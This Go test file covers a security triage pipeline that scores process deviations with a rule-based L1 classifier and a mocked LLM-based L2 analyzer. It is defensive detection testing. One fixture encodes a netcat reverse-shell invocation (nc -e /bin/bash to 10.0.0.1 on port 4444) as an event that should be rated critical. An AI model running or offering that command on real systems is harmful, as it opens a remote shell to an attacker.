package triage

import (
	"fmt"
	"testing"

	"github.com/philip-ai/philip/agent/sensor"
	"github.com/philip-ai/philip/backend/baseline"
	"github.com/philip-ai/philip/backend/detection"
)

// mockLLMProvider implements LLMProvider for testing.
type mockLLMProvider struct {
	response *TriageResponse
	err      error
	called   bool
}

func (m *mockLLMProvider) Analyze(req TriageRequest) (*TriageResponse, error) {
	m.called = true
	if m.err != nil {
		return nil, m.err
	}
	return m.response, nil
}

func (m *mockLLMProvider) Name() string {
	return "mock"
}

func TestPipeline_Triage_AllBenignSkipsL2(t *testing.T) {
	mock := &mockLLMProvider{
		response: &TriageResponse{Verdict: VerdictSuspicious},
	}

	logger := newTestLogger()
	l1 := NewL1Classifier(logger)
	l2 := NewL2Analyzer(mock, logger)
	pipeline := NewPipeline(l1, l2, logger)

	result, err := pipeline.Triage(TriageRequest{
		Deviations: []detection.ScoredDeviation{
			{
				DeviationType: detection.DeviationNewProcess,
				Event:         sensor.Event{Binary: "/usr/bin/npm"},
				Score:         0.3,
			},
		},
		Baseline:   &baseline.RepositoryBaseline{Status: "active"},
		Repository: "owner/repo",
	})

	if err != nil {
		t.Fatalf("Triage failed: %v", err)
	}
	if result.Final.Verdict != VerdictBenign {
		t.Errorf("verdict = %s, want benign", result.Final.Verdict)
	}
	if result.L2Invoked {
		t.Error("L2 should not have been invoked for all-benign deviations")
	}
	if mock.called {
		t.Error("mock LLM provider should not have been called")
	}
}

func TestPipeline_Triage_EscalatesToL2(t *testing.T) {
	mock := &mockLLMProvider{
		response: &TriageResponse{
			Verdict:    VerdictSuspicious,
			Confidence: 0.8,
			Reasoning:  "Unknown binary dropping files",
			Severity:   "high",
		},
	}

	logger := newTestLogger()
	l1 := NewL1Classifier(logger)
	l2 := NewL2Analyzer(mock, logger)
	pipeline := NewPipeline(l1, l2, logger)

	result, err := pipeline.Triage(TriageRequest{
		Deviations: []detection.ScoredDeviation{
			{
				DeviationType: detection.DeviationNewProcess,
				Event:         sensor.Event{Binary: "/tmp/unknown-tool"},
				Score:         0.8,
			},
		},
		Baseline:   &baseline.RepositoryBaseline{Status: "active"},
		Repository: "owner/repo",
	})

	if err != nil {
		t.Fatalf("Triage failed: %v", err)
	}
	if !result.L2Invoked {
		t.Error("L2 should have been invoked")
	}
	if !mock.called {
		t.Error("mock LLM provider should have been called")
	}
	if result.Final.Verdict != VerdictSuspicious {
		t.Errorf("verdict = %s, want suspicious", result.Final.Verdict)
	}
	if result.Final.Reasoning != "Unknown binary dropping files" {
		t.Errorf("reasoning = %q, want from mock", result.Final.Reasoning)
	}
}

func TestPipeline_Triage_L2FailureFallback(t *testing.T) {
	tests := []struct {
		name            string
		l1Result        *TriageResponse // what L1 would return (nil = escalate)
		deviations      []detection.ScoredDeviation
		wantVerdict     Verdict
		wantL2Invoked   bool
	}{
		{
			name: "L2 fails with L1 critical result falls back to L1",
			deviations: []detection.ScoredDeviation{
				{
					DeviationType: detection.DeviationNewProcess,
					Event: sensor.Event{
						Binary: "/usr/bin/nc",
						Args:   []string{"-e", "/bin/bash", "10.0.0.1", "4444"},
					},
					Score: 1.0,
				},
			},
			wantVerdict:   VerdictCritical,
			wantL2Invoked: true,
		},
		{
			name: "L2 fails with unclassified deviations falls back to suspicious",
			deviations: []detection.ScoredDeviation{
				{
					DeviationType: detection.DeviationNewProcess,
					Event:         sensor.Event{Binary: "/tmp/mystery"},
					Score:         0.8,
				},
			},
			wantVerdict:   VerdictSuspicious,
			wantL2Invoked: true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			mock := &mockLLMProvider{
				err: fmt.Errorf("OpenAI API error: rate limited"),
			}

			logger := newTestLogger()
			l1 := NewL1Classifier(logger)
			l2 := NewL2Analyzer(mock, logger)
			pipeline := NewPipeline(l1, l2, logger)

			result, err := pipeline.Triage(TriageRequest{
				Deviations: tc.deviations,
				Baseline:   &baseline.RepositoryBaseline{Status: "active"},
				Repository: "owner/repo",
			})

			if err != nil {
				t.Fatalf("Triage should not error on L2 failure: %v", err)
			}
			if result.L2Invoked != tc.wantL2Invoked {
				t.Errorf("L2Invoked = %v, want %v", result.L2Invoked, tc.wantL2Invoked)
			}
			if result.Final.Verdict != tc.wantVerdict {
				t.Errorf("verdict = %s, want %s", result.Final.Verdict, tc.wantVerdict)
			}
		})
	}
}

func TestPipeline_Triage_L2ReturnsBenign(t *testing.T) {
	mock := &mockLLMProvider{
		response: &TriageResponse{
			Verdict:    VerdictBenign,
			Confidence: 0.9,
			Reasoning:  "This is a legitimate tool update",
			Severity:   "low",
		},
	}

	logger := newTestLogger()
	l1 := NewL1Classifier(logger)
	l2 := NewL2Analyzer(mock, logger)
	pipeline := NewPipeline(l1, l2, logger)

	result, err := pipeline.Triage(TriageRequest{
		Deviations: []detection.ScoredDeviation{
			{
				DeviationType: detection.DeviationNewProcess,
				Event:         sensor.Event{Binary: "/usr/local/bin/new-linter"},
				Score:         0.6,
			},
		},
		Baseline:   &baseline.RepositoryBaseline{Status: "active"},
		Repository: "owner/repo",
	})

	if err != nil {
		t.Fatalf("Triage failed: %v", err)
	}
	if result.Final.Verdict != VerdictBenign {
		t.Errorf("verdict = %s, want benign (L2 overrides)", result.Final.Verdict)
	}
}

func TestSeverityFromDeviations(t *testing.T) {
	tests := []struct {
		name         string
		deviations   []detection.ScoredDeviation
		wantSeverity string
	}{
		{
			name:         "no deviations is low",
			deviations:   nil,
			wantSeverity: "low",
		},
		{
			name: "max score 0.95 is critical",
			deviations: []detection.ScoredDeviation{
				{Score: 0.95},
			},
			wantSeverity: "critical",
		},
		{
			name: "max score 0.75 is high",
			deviations: []detection.ScoredDeviation{
				{Score: 0.75},
			},
			wantSeverity: "high",
		},
		{
			name: "max score 0.5 is medium",
			deviations: []detection.ScoredDeviation{
				{Score: 0.5},
			},
			wantSeverity: "medium",
		},
		{
			name: "max score 0.2 is low",
			deviations: []detection.ScoredDeviation{
				{Score: 0.2},
			},
			wantSeverity: "low",
		},
		{
			name: "multiple deviations uses max",
			deviations: []detection.ScoredDeviation{
				{Score: 0.3},
				{Score: 0.85},
				{Score: 0.1},
			},
			wantSeverity: "high",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := severityFromDeviations(tc.deviations)
			if got != tc.wantSeverity {
				t.Errorf("severityFromDeviations() = %s, want %s", got, tc.wantSeverity)
			}
		})
	}
}
